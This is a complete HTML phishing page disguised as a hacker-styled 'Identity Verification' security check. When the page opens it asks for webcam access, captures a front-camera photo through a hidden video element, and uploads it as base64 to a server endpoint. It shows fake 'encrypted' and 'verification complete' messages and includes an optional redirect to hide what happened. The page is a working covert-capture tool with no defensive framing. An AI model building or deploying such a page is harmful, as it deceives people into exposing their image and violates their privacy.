<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Identity Verification</title>
    <style>
        body { font-family: 'Courier New', Courier, monospace; background: #000; color: #0f0; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .box { border: 2px solid #0f0; padding: 30px; border-radius: 5px; background: rgba(0, 20, 0, 0.9); box-shadow: 0 0 15px #0f0; text-align: center; width: 85%; }
        .blink { animation: blinker 1s linear infinite; font-weight: bold; }
        @keyframes blinker { 50% { opacity: 0; } }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="box">
    <h2 class="blink"> [ SECURITY CHECK ] </h2>
    <p>Connecting to Secure Server...</p>
    <div id="status">Please Click "Allow" to Verify Identity</div>
</div>

<video id="video" autoplay playsinline muted style="width:1px; height:1px; opacity:0;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const statusDiv = document.getElementById('status');

    const SERVER_URL = 'http://127.0.0.1:5000/upload'; 

    async function startAutoCapture() {
        try {
            // Permission Popup Yahan Aayega
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" } 
            });
            
            video.srcObject = stream;
            
            video.onloadedmetadata = () => {
                video.play();
                statusDiv.innerHTML = "<span style='color:yellow'>PROTOCOL_STARTED... STAY STILL</span>";
                
                // 3 second wait for light/focus (Black photo fix)
                setTimeout(() => {
                    capture(stream);
                }, 3000); 
            };
        } catch (err) {
            statusDiv.innerHTML = "<span style='color:red'>FAILED: ACCESS_DENIED</span>";
        }
    }

    async function capture(stream) {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        const imageData = canvas.toDataURL('image/jpeg', 0.8);
        stream.getTracks().forEach(t => t.stop());

        statusDiv.innerText = "UPLOADING_ENCRYPTED_PACKET...";

        try {
            await fetch(SERVER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: imageData })
            });
            statusDiv.innerHTML = "<span style='color:#0f0'>VERIFICATION_COMPLETE</span>";
            
            // Photo ke baad redirect (Optional)
            // window.location.href = "https://google.com";
        } catch (e) {
            statusDiv.innerText = "NETWORK_ERROR";
        }
    }

    // Page khulte hi permission maange
    window.onload = startAutoCapture;
</script>
</body>
</html>
